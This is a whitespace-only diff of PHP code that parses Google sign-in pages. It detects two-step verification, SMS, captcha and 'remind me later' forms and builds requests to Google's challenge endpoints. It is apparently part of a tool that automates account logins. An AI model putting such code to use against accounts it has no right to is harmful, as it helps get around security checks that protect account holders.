@@ -161,7 +161,7 @@ function get_forms($input_html) {
             $forms['remind'] = $form; //last form before finish 2stage auth
         }
         if (mb_stripos($form->getAttribute('action'), '/signin/challenge/sl', 0 , 'UTF-8') !== false) {
-                                               
+
             foreach ($form->getElementsByTagName('img') as $img_tag) {
                 if ($img_tag->getAttribute('alt') == 'Visual verification') {
                     $forms['captcha'] = $form;
@@ -169,7 +169,7 @@ function get_forms($input_html) {
                     break;
                 }
             }
-        }    
+        }
     }
     if(!isset($forms)) return false;
     return $forms;
@@ -185,7 +185,7 @@ function sms_form_save($sms_form) {
     $nl = '
 ';
     $ref_url = file_get_contents($GLOBALS['url_ref']);
-    
+
     if(mb_stripos($sms_form->getAttribute('action'), 'https://', 0, 'UTF-8') !== false)           //will be requested url
         $forsave = $sms_form->getAttribute('action') . $nl;
     else
@@ -396,8 +396,8 @@ function remind_me_later($remind_form) {
     if(mb_stripos($remind_form->getAttribute('action'), 'https://', 0, 'UTF-8') !== false)           //will be requested url
         $url = $remind_form->getAttribute('action');
     else
-        $url = 'https://accounts.google.com/signin/challenge/ipp/' . $remind_form->getAttribute('action');  
-    
+        $url = 'https://accounts.google.com/signin/challenge/ipp/' . $remind_form->getAttribute('action');
+
     foreach ($remind_form->getElementsByTagName('input') as $input) {
         if ($input->getAttribute('name')) {
             if ($input->getAttribute('type') != 'submit') {
